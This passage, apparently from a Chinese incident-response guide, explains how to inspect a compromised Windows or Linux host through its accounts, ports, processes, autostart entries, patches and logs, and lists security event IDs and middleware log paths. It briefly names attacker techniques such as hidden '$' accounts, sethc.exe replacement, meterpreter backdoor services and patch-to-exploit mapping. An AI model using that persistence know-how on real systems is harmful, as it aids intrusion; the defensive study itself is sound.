<p>检查方法2：</p>
<p>通过 D盾web查杀工具进行检测，其中集成了对克隆账号、隐藏账号检测的功能</p>
<p><img src="/photo/16a5aa2e0d04108b3840e94e17254990.jpeg" alt="img"></p>
<h5 id="（四）结合日志排查用户是否出现异常"><a href="#（四）结合日志排查用户是否出现异常" class="headerlink" title="（四）结合日志排查用户是否出现异常"></a>（四）结合日志排查用户是否出现异常</h5><p>检查方法1：</p>
<blockquote>
<p>1、在桌面打开运行（可使用快捷键 win+R），输入 <a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=eventvwr.msc&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22607999114%22%7D">eventvwr.msc</a> 命令 2、打开时间 <a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E6%9F%A5%E7%9C%8B%E5%99%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22607999114%22%7D">查看器</a>，分析用户登录日志</p>
</blockquote>
<p><img src="/photo/7ad8dd6d6eba24ee223852055044808f.jpeg" alt="img"></p>
<p>检查方法2：</p>
<blockquote>
<p>通过LogFusion查看日志记录</p>
</blockquote>
<p><img src="/photo/92ad261f1a75566c716ec88f10f8cfed.jpeg" alt="img"></p>
<h4 id="二、检查异常端口、进程"><a href="#二、检查异常端口、进程" class="headerlink" title="二、检查异常端口、进程"></a>二、检查异常端口、进程</h4><p>端口作为计算机内部与外部数据交互的窗口，在攻击者眼里也是作为香饽饽的存在，在入侵系统后，攻击者可以在计算机上开启专属的端口来访问被害主机或植入病毒用于挖矿等，熟悉计算机的朋友应该都知道常用的端口也就那么几个，所以通过排查可疑端口能确定主机是否存在后门、是否被植入挖矿病毒等，再根据端口的PID对可疑进程对应的程序排查，确定是否为恶意程序。</p>
<h5 id="（一）排查可疑端口"><a href="#（一）排查可疑端口" class="headerlink" title="（一）排查可疑端口"></a>（一）排查可疑端口</h5><p>检查方法1：</p>
<p>1、使用netstat命令查看当前网络连接，定位可疑的ESTABLISHED连接</p>
<p>netstat -ano</p>
<p>2、根据PID编号通过tasklist对进程进行定位</p>
<p>tasklist ｜ findstr “PID”<br><img src="/photo/6224462849a5c3d2174e1e300d159638.jpeg" alt="img"></p>
<p>检查方法2:</p>
<blockquote>
<p>通过D盾web查杀工具进行端口查看</p>
</blockquote>
<p><img src="/photo/31303803ffaa8e6fa44434c292bf4dc9.jpeg" alt="img"></p>
<h5 id="（二）排查可疑进程"><a href="#（二）排查可疑进程" class="headerlink" title="（二）排查可疑进程"></a>（二）排查可疑进程</h5><p>检查方法1：</p>
<p>1、在桌面打开运行（可使用快捷键 win+R），输入 msinfo32 命令 2、依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p>
<p><img src="/photo/7fe417c5572726898578739d96a43d92.jpeg" alt="img"></p>
<p>检查方法2：</p>
<blockquote>
<p>打开D盾_web查杀工具的进程查看，关注没有签名信息的进程</p>
</blockquote>
<p><img src="/photo/89fa4b957d67b11307d18d7a92b2e936.jpeg" alt="img"></p>
<p>检查方法3：</p>
<blockquote>
<p>通过微软官方提供的 Process Explorer 等工具进行排查</p>
</blockquote>
<p><img src="/photo/6f5e58e55aea642cce19853f0df8258b.jpeg" alt="img"></p>
<p>在查看可疑的进程及其子进程。可以重点观察以下内容：</p>
<blockquote>
<p>1、没有签名验证信息的进程 2、没有描述信息的进程 3、进程的属主 4、进程的路径是否合法 5、CPU 或内存资源占用长时间过高的进程</p>
</blockquote>
<h4 id="三、检查启动项、计划任务和服务"><a href="#三、检查启动项、计划任务和服务" class="headerlink" title="三、检查启动项、计划任务和服务"></a>三、检查启动项、计划任务和服务</h4><p>启动项、计划任务、服务是攻击者维持权限的惯用手段。在入侵windows计算机后，攻击者可以通过修改注册表、替换粘滞键程序在系统启动时就获得权限，也能够在管理员权限下设置计划任务，因为计划任务后门分为管理员权限和普通用户权限两种。管理员权限可以设置更多的计划任务，例如重启后运行等。也可以通过meterpreter创建后门服务。</p>
<h5 id="（一）排查异常启动项"><a href="#（一）排查异常启动项" class="headerlink" title="（一）排查异常启动项"></a>（一）排查异常启动项</h5><p>检查方法1：</p>
<p>单击【开始】&gt;【 所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有 非业务程序在该目录下。</p>
<p>检查方法2：</p>
<blockquote>
<p>在桌面打开运行（可使用快捷键 win+R），输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p>
</blockquote>
<p>检查方法3:</p>
<p>在桌面打开运行（可使用快捷键 win+R），输入 regedit，打开注册表，查看 开机启动项是否正常，特别注意如下三个 注册表项：<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。<br><img src="/photo/image-20240702183239572.png" alt="image-20240702183239572"></p>
<p>检查方法4:</p>
<blockquote>
<p>利用安全软件查看启动项、开机时间管理等。</p>
</blockquote>
<p><img src="/photo/c9d5b1f8ba118dd7906893e731e267bc.jpeg" alt="img"></p>
<p>检查方法5:</p>
<blockquote>
<p>在桌面打开运行（可使用快捷键 win+R），输入 gpedit.msc 查看</p>
</blockquote>
<p><img src="/photo/9e5776e149645ffc437a2f7a2f426e4f.jpeg" alt="img"></p>
<h5 id="（二）排查计划任务"><a href="#（二）排查计划任务" class="headerlink" title="（二）排查计划任务"></a>（二）排查计划任务</h5><p>检查方法1：</p>
<blockquote>
<p>1、在桌面打开运行（可使用快捷键 win+R），输入 control 打开控制面板 2、在 系统与安全 中查看计划任务属性，便可以发现 <a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22607999114%22%7D">木马文件</a>的路径。</p>
</blockquote>
<p><img src="/photo/16008c067cc21fca402b973631b5d560.jpeg" alt="img"></p>
<p>检查方法2：1、在桌面打开运行（可使用快捷键 win+R），输入 cmd 打开命令行窗口 2、检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接，其中计划任务在windows7及之前版本的操作系统中使用at命令进行调用，在从 windows8版本开始的操作系统中使用schtasks命令调用。<br>windows server 2016 下执行 schtasks<br><img src="/photo/6505cbc251270504c82658fd6e207aa6.jpeg" alt="img"></p>
<p>检查方法3：利用安全软件查看计划任务。</p>
<p><img src="/photo/9f4fef18ca286cb75f0d693652bcf742.jpeg" alt="img"></p>
<h5 id="（三）排查服务自启动"><a href="#（三）排查服务自启动" class="headerlink" title="（三）排查服务自启动"></a>（三）排查服务自启动</h5><p>检查方法：</p>
<blockquote>
<p>1、在桌面打开运行（可使用快捷键 win+R），输入 services.msc 2、注意服务状态和启动类型，检查是否有异常服务</p>
</blockquote>
<p><img src="/photo/5d5b9dd12c0559b66eddf45bac0ef4bb.jpeg" alt="img"></p>
<h4 id="四、检查系统相关信息"><a href="#四、检查系统相关信息" class="headerlink" title="四、检查系统相关信息"></a>四、检查系统相关信息</h4><p>系统本身如果存在漏洞，那么结果往往是致命的，如果计算机存在永恒之蓝漏洞且未采取防护措施。那么攻击者就能直接通过MSF的漏洞利用程序获取目标windows系统的system权限。与此同时，攻击者在进入系统后往往也会留一些蛛丝马迹，如未将上传文件清除、浏览器浏览记录未删除、下载的文件未删除等。在检查系统相关信息时就需要重点关注系统本身存在的漏洞以及攻击者使用过的文件。</p>
<h5 id="（一）查看系统版本以及补丁信息"><a href="#（一）查看系统版本以及补丁信息" class="headerlink" title="（一）查看系统版本以及补丁信息"></a>（一）查看系统版本以及补丁信息</h5><p>检查方法：</p>
<p>1、在桌面打开运行（可使用快捷键 win+R）输入 systeminfo 2、查看系统信息和补丁状态<br><img src="/photo/6e4765bab4052647fdedba2026b0b5cf.jpeg" alt="img"></p>
<p>3、将内容导入文本，利用 windows-exploit-suggester 对系统补丁进行漏洞利用分析</p>
<p>python windows-exploit-suggester.py –database 2021-08-26-mssb.xls –systeminfo systeminfo.txt </p>
<h5 id="（二）查看可疑目录及文件"><a href="#（二）查看可疑目录及文件" class="headerlink" title="（二）查看可疑目录及文件"></a>（二）查看可疑目录及文件</h5><p>检查方法1：</p>
<blockquote>
<p>查看用户目录，是否存在新建用户目录</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Window</span> <span class="number">2003</span>版本 : C:\Documents <span class="keyword">and</span> Settings</span><br><span class="line"><span class="keyword">Window</span> <span class="number">2003</span>以后版本 : C:\Users\</span><br></pre></td></tr></table></figure>

<p>检查方法2：1、在桌面打开运行（可使用快捷键 win+R）输入 %UserProfile%\Recent 2、分析最近打开的 可疑文件</p>
<p><img src="/photo/c4729ff2c2dc492011421c2a8a538e13.jpeg" alt="img"></p>
<p>检查方法3：</p>
<blockquote>
<p>1、点击文件资源管理器，查找服务器内中的各个文件夹 2、将文件夹文件按时间进行排序，查找可疑文件，其中修改时间在创建时间之前的为可疑文件，也可以在搜索中搜索某一时间修改的文件。重点关注windows\system32的sethc.exe是否被替换为cmd程序</p>
</blockquote>
<p><img src="/photo/e29ead79082a76515c169336fa64740d.jpeg" alt="img"></p>
<h5 id="（三）查看隐藏文件"><a href="#（三）查看隐藏文件" class="headerlink" title="（三）查看隐藏文件"></a>（三）查看隐藏文件</h5><p>检查方法1：</p>
<blockquote>
<p>1、在桌面打开运行（可使用快捷键 win+R），输入 control，进入控制面板 2、找到文件资源管理器选项，点击 查看 后，取消”隐藏受保护的操作系统文件“勾选，在隐藏文件和文件夹下面的单选选择显示隐藏的文件、文件夹和驱动器</p>
</blockquote>
<h4 id="五、日志分析"><a href="#五、日志分析" class="headerlink" title="五、日志分析"></a>五、日志分析</h4><p>主要查看系统日志和web日志，通过日志可以帮助我们验证对入侵过程的判断和发现其他入侵行为。但它的前提则是日志记录已开启的情况下才能获取。这块具体会在之后的日志分析篇提到</p>
<h5 id="（一）系统日志"><a href="#（一）系统日志" class="headerlink" title="（一）系统日志"></a>（一）系统日志</h5><p>分析方法：</p>
<p>1、在桌面打开运行（可使用快捷键 win+R），输入 eventvwr.msc 2、找到 事件查看器，查看windows日志（包括应用程序、安全、Setup、系统、事件）（二）<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=web%E6%97%A5%E5%BF%97&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22607999114%22%7D">web日志</a></p>
<h5 id="（二）web日志"><a href="#（二）web日志" class="headerlink" title="（二）web日志"></a>（二）web日志</h5><p>分析方法：</p>
<p>分析方法：</p>
<blockquote>
<p>1、找到 <a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E4%B8%AD%E9%97%B4%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22607999114%22%7D">中间件</a>、应用、WAF的日志（包括但不限于IIS、Nginx、宝塔、网站等） 2、打包至本地进行分析，在编辑器中对关键字进行搜索</p>
</blockquote>
<p><img src="/photo/b3e656a3ceb00ad339d3345c43db8601.jpeg" alt="img"></p>
<h4 id="六、工具查杀"><a href="#六、工具查杀" class="headerlink" title="六、工具查杀"></a><strong>六、工具查杀</strong></h4><p>webshell和病毒都是windows系统的大敌，它们可以维持攻击者的系统权限、盗窃资料、感染其他主机、加密文件等，对操作系统造成非常大的危害。这里推荐D盾以及火绒软件（当然查杀软件越多越好）。对病毒进行全盘扫描，而对webshell进行web目录扫描。</p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="windows日志"><a href="#windows日志" class="headerlink" title="windows日志"></a>windows日志</h3><p><strong>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志</strong>。<strong>系统和应用程序日志</strong>存储着故障排除信息，对于<strong>系统管理员</strong>更为有用。<br><strong>安全日志</strong>记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于 <strong>调查人员</strong>而言，更有帮助。除了应用程序日志、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97&spm=1001.2101.3001.7020">系统日志</a>和安全日志以外，一些特殊的系统服务配置可能也会产生其他日志文件，例如<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Powershell&spm=1001.2101.3001.7020">Powershell</a>日志、WWW日志、FTP日志，DNS服务器日志等。</p>
<p>操作命令为eventvwr.msc</p>
<h4 id="应用程序日志"><a href="#应用程序日志" class="headerlink" title="应用程序日志"></a>应用程序日志</h4><p>应用程序日志包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。</p>
<p>默认位置：C:\Windows\System32\Winevt\Logs\Application.evtx</p>
<h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><p>系统日志记录操作系统组件产生的事件，主要包括<strong>驱动程序、系统组件和应用软件的崩溃以及数据丢失错误</strong>等</p>
<blockquote>
<p>默认位置：C:\Windows\System32\Winevt\Logs\System.evtx</p>
</blockquote>
<h4 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h4><p>安全日志记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>
<p>默认位置：C:\Windows\System32\Winevt\Logs\Security.evtx</p>
<h4 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h4><p><strong>事件ID是区分系统事件的一个重要字段，在事件查看器中可以通过事件ID筛选日志（本文将在第四章对事件ID进行总计梳理）</strong></p>
<p>查看系统登录日志时，重点关注以下字段信息。</p>
<ul>
<li>事件ID：4624（登录成功）和4625（登录失败）。</li>
<li>登录类型：根据登录类型分析登录操作来源。</li>
<li>账户名：登录操作时使用的账户名。</li>
<li>源网络地址：登录操作来源IP。</li>
<li>进程信息：登录操作调用的进程。</li>
</ul>
<p>常见的事件id</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1074	计算机开机、关机、重启的时间、原因、注释	查看异常关机情况</span><br><span class="line">1102	清理审计日志	发现篡改事件日志的用户</span><br><span class="line">4624	登录成功	检测异常的未经授权的登录</span><br><span class="line">4625	登陆失败	检测可能的暴力密码攻击</span><br><span class="line">4632	成员已添加到启用安全性的本地组	检测滥用授权用户行为</span><br><span class="line">4634	注销用户	</span><br><span class="line">4648	试图使用显式凭据登录	</span><br><span class="line">4657	注册表值被修改	</span><br><span class="line">4663	尝试访问对象	检测未经授权访问文件和文件夹的行为。</span><br><span class="line">4672	administrator超级管理员登录（被赋予特权）	</span><br><span class="line">4698	计划任务已创建	</span><br><span class="line">4699	计划任务已删除	</span><br><span class="line">4700	启用计划任务	</span><br><span class="line">4701	禁用计划任务	</span><br><span class="line">4702	更新计划任务	</span><br><span class="line">4720	创建用户	</span><br><span class="line">4726	删除用户	</span><br><span class="line">4728	成员已添加到启用安全性的全局组	确保添加安全组成员的资格信息</span><br><span class="line">4740	锁定用户账户	检测可能的暴力密码攻击</span><br><span class="line">4756	成员已添加到启用安全性的通用组	</span><br><span class="line">6005	表示日志服务已经启动（表明系统正常启动了）	查看系统启动情况</span><br><span class="line">6006	表示日志服务已经停止（如果在某天没看到6006事件，说明出现关机异常事件了）	查看异常关机情况</span><br><span class="line">6009	非正常关机（ctrl+alt+delete关机）	</span><br></pre></td></tr></table></figure>

<h4 id="4624"><a href="#4624" class="headerlink" title="4624"></a>4624</h4><p>登陆成功事件中将包含以下信息，其中需要特别关注<strong>账户名称、登陆类型、进程名称、源网络地址：<strong>在登录信息中可以根据登陆类型来区分登录者到底是从本地登录，还是从网络登录，以及其它更多的登录方式。因为了解了这些登录方式，将有助于从事件日志中发现可疑的黑客行为，并能够判断其攻击方式。以下列举了</strong>常见的登陆类型：</strong></p>
<p><img src="/photo/617a8fbe74f0449996d84861de90bc20.png" alt="在这里插入图片描述"></p>
<h4 id="4625"><a href="#4625" class="headerlink" title="4625"></a>4625</h4><p>登陆失败事件中将包含以下信息，其中需要特别关注<strong>账户名称、登陆类型、失败信息、调用方进程名称、源网络地址：</strong></p>
<p><strong>4625登陆失败事件的子状态码表示登陆失败的原因，在此整理常见的子状态码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">子状态码	描述</span><br><span class="line">0XC000005E	当前没有可用于服务登录请求的登录服务器。</span><br><span class="line">0xC0000064	用户使用拼写错误或错误用户帐户进行登录</span><br><span class="line">0xC000006A	用户使用拼写错误或错误密码进行登陆</span><br><span class="line">0XC000006D	原因可能是用户名或身份验证信息错误</span><br><span class="line">0XC000006E	指示引用的用户名和身份验证信息有效，但某些用户帐户限制阻止了成功的身份验证（例如时间限制）。</span><br><span class="line">0xC000006F	用户在授权时间之外登录</span><br><span class="line">0xC0000070	用户从未经授权的工作站登录</span><br><span class="line">0xC0000071	用户使用过期密码登录</span><br><span class="line">0xC0000072	用户登录到管理员已禁用的帐户</span><br><span class="line">0XC00000DC	指示 Sam 服务器处于错误状态，无法执行所需操作。</span><br><span class="line">0XC0000133	DC 和其他计算机之间的时钟完全不同步</span><br><span class="line">0XC000015B	此计算机上尚未授予用户请求的登录类型（也称为_登录权限_）</span><br><span class="line">0XC000018C	登录请求失败，因为主域和受信任域之间的信任关系失败。</span><br><span class="line">0XC0000192	尝试登录，但 Netlogon 服务未启动。</span><br><span class="line">0xC0000193	用户使用过期帐户登录</span><br><span class="line">0XC0000224	用户需要在下次登录时更改密码</span><br><span class="line">0XC0000225	很明显，这是 Windows 中的错误而非风险</span><br><span class="line">0xC0000234	帐户已锁定的用户登录</span><br><span class="line">0XC00002EE	失败原因：登录时出错</span><br><span class="line">0XC0000413	登录失败：登录的计算机受身份验证防火墙保护。 不允许指定的帐户对计算机进行身份验证。</span><br><span class="line">0x0	状态正常。</span><br></pre></td></tr></table></figure>

<h4 id="特权使用"><a href="#特权使用" class="headerlink" title="特权使用"></a>特权使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">事件ID	说明</span><br><span class="line">4672	给新登录分配特权</span><br><span class="line">4673	要求特权服务</span><br><span class="line">4674	试图对特权对象尝试操作</span><br></pre></td></tr></table></figure>

<p>主机隔离、系统备份、病毒及后门等的检测和排查、清除病毒及后门、修复漏洞、安全加固、系统恢复、调查追踪<br>这里面会展开问的比较多的是排查部分。以linux举例<br>**1.**账号排查：记住几个关键的文件，如<code>/etc/passwd</code>、<code>/etc/shadow</code>，看看有没有异常账号、特权账号，例如uid&#x3D;0|可远程登入|sudo权限，对发现的可疑账号进行删除<br>**2.**历史命令：<code>/home</code>目录下的各个账号，<code>.bash_history</code>			windwos:doskey &#x2F;history<br>**3.**进程、端口等：<code>netstat -antlp</code>，<code>ps aux</code>，<code>top</code>等查看，发现cpu占比很高或其他异常的进程，通过<code>ls -l /proc/PID/exe</code> ，可以找到异常程序所在位置。通过<code>kill</code>可以杀死进程 </p>
<p>windwos:例如：任务管理器中显示的进程名为Taskmgr.exe.</p>
<p>查找路径方法是：打开cmd.exe,输入wmic ,然后输入process where（Description&#x3D;”Taskmgr.exe”)</p>
<p>**4.**开机启动项、定时任务等：如果杀死进程后又重新启动，在以下位置可</p>
<p>能找到问题所在。开机启动项<code>/etc/ini.d</code>；自启项<code>/etc/rc.local</code>；定时任务<code>crontab</code><br>**5.**日志：<code>/var/log/*</code>，里面有很多日志，比如<code>/wtmp</code>记每个用户的登录次数和登录时间，<code>/btmp</code>记录错误登录的日志<br>还有些比如命令行<code>last</code>查看登入信息，<code>find</code>查看文件文件改动时间、查看777权限文件等</p>
<h3 id="linux日志"><a href="#linux日志" class="headerlink" title="linux日志"></a>linux日志</h3><p>工具有logwatch</p>
<table>
<thead>
<tr>
<th>&#x2F;var&#x2F;log&#x2F;cron</th>
<th>记录了系统定时任务相关的日志</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;var&#x2F;log&#x2F;cups</td>
<td>记录打印信息的日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;dmesg</td>
<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;mailog</td>
<td>记录邮件信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;message</td>
<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系 统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要 使用lastlog命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文 件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登 录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;secure</td>
<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，s</td>
</tr>
</tbody></table>
<p>&#x2F;var&#x2F;log&#x2F;boot.log<br>记录的Linux 系统在引导阶段发生的事件，也就是说系统开机自检过程中产生的日志。</p>
<p>&#x2F;var&#x2F;log&#x2F;maillog<br>该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动。它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统。</p>
<p>&#x2F;var&#x2F;log&#x2F;syslog<br>它只记录警告信息，常常是系统出问题的信息，所以更应该关注该文件）<br>要让系统生成syslog日志文件，在&#x2F;etc&#x2F;syslog.conf文件中加上：*.warning &#x2F;var&#x2F;log&#x2F;syslog<br>该日志文件能记录当用户登录时login记录下的错误口令、Sendmail的问题、su命令执行失败等信息。</p>
<p>&#x2F;var&#x2F;log&#x2F;xferlog<br>该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用。<br>　　该文件的格式为：第一个域是日期和时间，第二个域是下载文件所花费的秒数、远程系统名称、文件大小、本地路径名、传输类型（a：ASCII，b：二进制）、与压缩相关的标志或tar，或”_”（如果没有压缩的话）、传输方向（相对于服务器而言：i代表进，o代表出）、访问模式（a：匿名，g：输入口令，r：真实用户）、用户名、服务名（通常是ftp）、认证方法（l：RFC931，或0），认证用户的ID或”*”。</p>
<h2 id="日志路径"><a href="#日志路径" class="headerlink" title="日志路径"></a>日志路径</h2><h3 id="IIS中间件日志"><a href="#IIS中间件日志" class="headerlink" title="IIS中间件日志"></a>IIS中间件日志</h3><p>IIS（Internet information services，互联网信息服务）是微软公司提供的、运行在Windows系统下的中间件。它主要用来解析.ASP、.ASA、.CER这三种文件格式的文件，也可以结合环境资源包解析PHP等。常见的IIS版本包括IIS 6.0&#x2F;7.0&#x2F;7.5&#x2F;8.0&#x2F;8.5。</p>
<p>IIS日志存放位置</p>
<p>不同的IIS日志默认目录不一样，可以自定义。IIS日志文件格式位“ex+年份的末两位数字+月份+日期”，后缀为.log，默认为按天数生成。</p>
<p>IIS每条日志的格式由data、time、c-ip、cs-method、cs-uri-stem、s-port、s-ip、cs(User-Agent)、sc-status、sc-bytes、cs-bytes组成。</p>
<p>date：发出请求时的日期。<br>time：发出请求时的时间。<br>c-ip：客户端IP地址。<br>cs-method：请求中使用的HTTP方法。<br>cs-uri-stem：URI资源，记录作为操作目标的统一资源标识符，即访问的页面文件。<br>s-port：为服务配置的服务器端口号。<br>s-ip：服务器的IP地址。<br>cs(User- Agent)：用户代理，包括客户端浏览器、操作系统等情况。<br>sc-status：协议状态，记录HTTP状态代码。<br>sc-bytes：服务器发送的字节数。<br>cs-bytes：服务器接收的字节数。</p>
<h3 id="Apache中间件日志"><a href="#Apache中间件日志" class="headerlink" title="Apache中间件日志"></a>Apache中间件日志</h3><p>Apache的配置文件”httpd.conf”中存在着两个日志文件，access.log为访问日志，error.log为错误日志。一般日志文件是在Apache安装目录的logs子目录中。</p>
<h3 id="Nginx中间件日志"><a href="#Nginx中间件日志" class="headerlink" title="Nginx中间件日志"></a>Nginx中间件日志</h3><p>Nginx中间件日志分为两种，access.log为访问日志，error.log为错误日志。默认日志会放在Nginx安装路径的logs目录中。如果通过yum源安装Nginx，那么access.log的默认路径为“var&#x2F;log&#x2F;nginx&#x2F;access.log”。</p>
<h3 id="Tomcat中间件日志"><a href="#Tomcat中间件日志" class="headerlink" title="Tomcat中间件日志"></a>Tomcat中间件日志</h3><p>Tomcat对应日志位于Tomcat目录下的“&#x2F;conf&#x2F;logging.properties”。<br>Tomcat默认有四种日志，catalina、localhost、manager、host-manager。</p>
<h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><p>Weblogic包含三种日志，server.log（该日志记录的是服务（包括admin server 和 app server）启动过程中和关闭过程中的日志），access.log（该文件记录了在某个时间段，某个ip地址上的客户端访问了服务器上的哪个文件），domain.log（记录了一个domain的运行情况）。</p>
<p>Weblogic8.x：</p>
<p>access.log在“$MV_HOME&#x2F;user_projects&#x2F;domains&#x2F;<domain_name>&#x2F;server_name&#x2F;server.log”</p>
<p>server.log在“$MV_HOME&#x2F;user_projects&#x2F;domains&#x2F;<domain_name>&#x2F;<server_name>&#x2F;<server_name>.log”</p>
<p>domain.log在“$MV_HOME&#x2F;user_projects&#x2F;domains&#x2F;<domain_name>&#x2F;<domain_name>.log”</p>
<p>Weblogic9.x：</p>
<p>access.log在“$MV_HOME&#x2F;user_projects&#x2F;domains&#x2F;<domain_name>&#x2F;servers&#x2F;<server_name>&#x2F;logs&#x2F;access.log”</p>
<p>server.log在“$MV_HOME&#x2F;user_projects&#x2F;domains&#x2F;<domain_name>&#x2F;servers&#x2F;<server_name>&#x2F;logs&#x2F;<server_name>.log”</p>
<p>domain.log在“$MV_HOME&#x2F;user_projects&#x2F;domains&#x2F;<domain_name>&#x2F;servers&#x2F;<adminserver_name>&#x2F;logs&#x2F;<domain_name>.log”</p>
<h2 id="网站挂马"><a href="#网站挂马" class="headerlink" title="网站挂马:"></a>网站挂马:</h2><p>通过日志分析漏洞存在点,删除木马,限制上传目录权限(为避免存在内存不死马,重启容器)</p>
<p>可以看到阿里云安骑士报了存在服务器存在webshell，访问该链接，显示403，应该是触发了上传目录下可读可写不可执行的安全策略。我们取得了相关服务器的权限之后，在主机上进行漏洞影响范围和攻击溯源。</p>
<p>登上服务器首先对系统安全进行排查，查看隐藏用户以及计划人物以及登录日志，初步判断攻击者并没有通过webshell提升到系统的权限。</p>
<p>从服务器dump下机器最近10天的web访问记录到本地进行溯源分析。</p>
<p>找到攻击payload,</p>
<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝:"></a>永恒之蓝:</h2><p>断网,关闭端口,设置权限,打补丁</p>
<h2 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户:"></a>隐藏账户:</h2><p>创建用户时，在用户名后面加上$，就会创建成隐藏账号。</p>
<p>隐藏用户不能在 <code>net user</code> 和控制面板中看到，需要用其他的方式。</p>
<p>net localgroup administrators  管理员组</p>
